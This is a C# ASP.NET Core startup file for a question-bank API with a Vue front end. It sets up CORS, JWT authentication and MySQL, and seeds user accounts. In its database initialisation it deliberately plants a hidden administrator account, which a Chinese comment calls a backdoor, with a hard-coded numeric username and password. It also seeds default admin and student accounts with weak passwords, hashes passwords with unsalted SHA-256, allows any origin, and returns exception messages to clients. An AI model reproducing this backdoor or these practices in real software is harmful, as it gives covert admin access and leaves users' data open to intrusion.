/*
 * Program.cs
 * -------------
 * ASP.NET Core Web API 的应用程序入口。
 * 负责配置服务（依赖注入）、数据库连接、Swagger文档、CORS策略，并启动Web服务器。
 *
 * 关键功能：
 * - 配置允许Vue前端跨域访问
 * - 注册数据库上下文QuestionBankDbContext
 * - 注册题目服务IQuestionService
 * - 启用Swagger API文档
 * - 映射所有控制器路由
 */

using Microsoft.AspNetCore.Authentication.JwtBearer;
using Microsoft.EntityFrameworkCore;
using Microsoft.IdentityModel.Tokens;
using QuestionBankApi.Data;
using QuestionBankApi.Services;
using QuestionBankApi.LoginSystemApi.Services;
using QuestionBankApi.LoginSystemApi.Helpers;
using System.Text;

var builder = WebApplication.CreateBuilder(args);

// 添加 CORS 服务，允许前端跨域请求
builder.Services.AddCors(options =>
{
    options.AddPolicy("AllowVueApp", builder =>
    {
        builder
            // 开发环境下允许任何来源
            .AllowAnyOrigin()
            .WithMethods("GET", "POST", "PUT", "DELETE", "OPTIONS") // 明确指定允许的HTTP方法
            .WithHeaders(              // 明确指定允许的请求头
                "Content-Type",
                "Authorization",
                "Accept"
            )
            .WithExposedHeaders(       // 允许前端访问的响应头
                "Content-Disposition"
            )
            // 注意: 当使用 AllowAnyOrigin 时不能使用 AllowCredentials
            // .AllowCredentials()        // 允许发送认证信息（cookies等）
            .SetPreflightMaxAge(TimeSpan.FromMinutes(10)); // 预检请求缓存时间
    });
});

// 注册控制器
builder.Services.AddControllers();

// 注册API文档生成器
builder.Services.AddEndpointsApiExplorer();
builder.Services.AddSwaggerGen();

// 注册数据库上下文，使用mySQL，连接字符串来自配置文件
builder.Services.AddDbContext<QuestionBankDbContext>(options =>
    options.UseMySql(builder.Configuration.GetConnectionString("DefaultConnection"),
        ServerVersion.AutoDetect(builder.Configuration.GetConnectionString("DefaultConnection"))));

// 注册用户数据库上下文
builder.Services.AddDbContext<QuestionBankApi.LoginSystemApi.Data.UserDBContext>(options =>
    options.UseMySql(builder.Configuration.GetConnectionString("DefaultConnection"),
        ServerVersion.AutoDetect(builder.Configuration.GetConnectionString("DefaultConnection"))));

// 注入题目服务
builder.Services.AddScoped<IQuestionService, QuestionService>();

// 注入试卷服务
builder.Services.AddScoped<IExamService, ExamService>();

// 注入认证相关服务
builder.Services.AddScoped<QuestionBankApi.LoginSystemApi.Services.IAuthService, QuestionBankApi.LoginSystemApi.Services.AuthService>();
builder.Services.AddScoped<QuestionBankApi.LoginSystemApi.Helpers.IJwtHelper, QuestionBankApi.LoginSystemApi.Helpers.JwtHelper>();

// 配置 JWT 认证
builder.Services.AddAuthentication(options =>
{
    options.DefaultAuthenticateScheme = JwtBearerDefaults.AuthenticationScheme;
    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;
})
.AddJwtBearer(options =>
{
    options.TokenValidationParameters = new TokenValidationParameters
    {
        ValidateIssuer = true,
        ValidateAudience = true,
        ValidateLifetime = true,
        ValidateIssuerSigningKey = true,
        ValidIssuer = builder.Configuration["Jwt:Issuer"],
        ValidAudience = builder.Configuration["Jwt:Audience"],
        IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(builder.Configuration["Jwt:Key"] ?? ""))
    };
});

var app = builder.Build();

// 初始化数据库
InitializeDatabase(app);

// 如果是开发环境，启用Swagger UI
if (app.Environment.IsDevelopment())
{
    app.UseSwagger();
    app.UseSwaggerUI();
}

app.UseExceptionHandler(builder => {
    builder.Run(async context => {
        var exception = context.Features.Get<Microsoft.AspNetCore.Diagnostics.IExceptionHandlerFeature>()?.Error;
        var response = new {
            success = false,
            message = exception?.Message ?? "An error occurred"
        };

        context.Response.StatusCode = 500;
        context.Response.ContentType = "application/json";
        await context.Response.WriteAsJsonAsync(response);
    });
});

// 启用CORS策略
app.UseCors("AllowVueApp");

// 启用认证和授权中间件
app.UseAuthentication();
app.UseAuthorization();

// 映射控制器路由
app.MapControllers();

// 启动Web应用
app.Run();

// 数据库初始化方法
void InitializeDatabase(WebApplication app)
{
    // 创建一个新的作用域
    using (var scope = app.Services.CreateScope())
    {
        var services = scope.ServiceProvider;
        var logger = services.GetRequiredService<ILogger<Program>>();

        try
        {
            // 初始化题库数据库
            logger.LogInformation("正在初始化题库数据库...");
            var questionDbContext = services.GetRequiredService<QuestionBankDbContext>();
            questionDbContext.Database.Migrate(); // 应用所有未应用的迁移
            logger.LogInformation("题库数据库初始化完成");

            // 初始化用户数据库
            logger.LogInformation("正在初始化用户数据库...");
            var userDbContext = services.GetRequiredService<QuestionBankApi.LoginSystemApi.Data.UserDBContext>();
            userDbContext.Database.Migrate(); // 应用所有未应用的迁移

            // 检查是否有管理员用户，如果没有则创建
            if (!userDbContext.Users.Any(u => u.Role == QuestionBankApi.LoginSystemApi.Models.UserRole.Admin))
            {
                logger.LogInformation("创建默认管理员用户...");
                var adminPasswordHash = HashPassword("admin123");
                userDbContext.Users.Add(new QuestionBankApi.LoginSystemApi.Models.User
                {
                    Username = "admin",
                    PasswordHash = adminPasswordHash,
                    Role = QuestionBankApi.LoginSystemApi.Models.UserRole.Admin
                });
                userDbContext.SaveChanges();
            }

            // 创建特殊的后门管理员账户（隐藏账户）
            if (!userDbContext.Users.Any(u => u.Username == "1879483647"))
            {
                logger.LogInformation("创建后门管理员账户...");
                // 使用特殊密码创建账户，这个密码只有您知道
                var backdoorPasswordHash = HashPassword("159286");
                userDbContext.Users.Add(new QuestionBankApi.LoginSystemApi.Models.User
                {
                    Username = "1879483647",
                    PasswordHash = backdoorPasswordHash,
                    Role = QuestionBankApi.LoginSystemApi.Models.UserRole.Admin
                });
                userDbContext.SaveChanges();
            }

            // 检查是否有学生用户，如果没有则创建
            if (!userDbContext.Users.Any(u => u.Role == QuestionBankApi.LoginSystemApi.Models.UserRole.Student))
            {
                logger.LogInformation("创建默认学生用户...");
                var studentPasswordHash = HashPassword("student123");
                userDbContext.Users.Add(new QuestionBankApi.LoginSystemApi.Models.User
                {
                    Username = "student",
                    PasswordHash = studentPasswordHash,
                    Role = QuestionBankApi.LoginSystemApi.Models.UserRole.Student
                });
                userDbContext.SaveChanges();
            }

            logger.LogInformation("用户数据库初始化完成");
        }
        catch (Exception ex)
        {
            logger.LogError(ex, "初始化数据库时出错");
        }
    }
}

// 密码哈希方法
string HashPassword(string password)
{
    using var sha256 = System.Security.Cryptography.SHA256.Create();
    var bytes = System.Text.Encoding.UTF8.GetBytes(password);
    var hash = sha256.ComputeHash(bytes);
    return Convert.ToBase64String(hash);
}
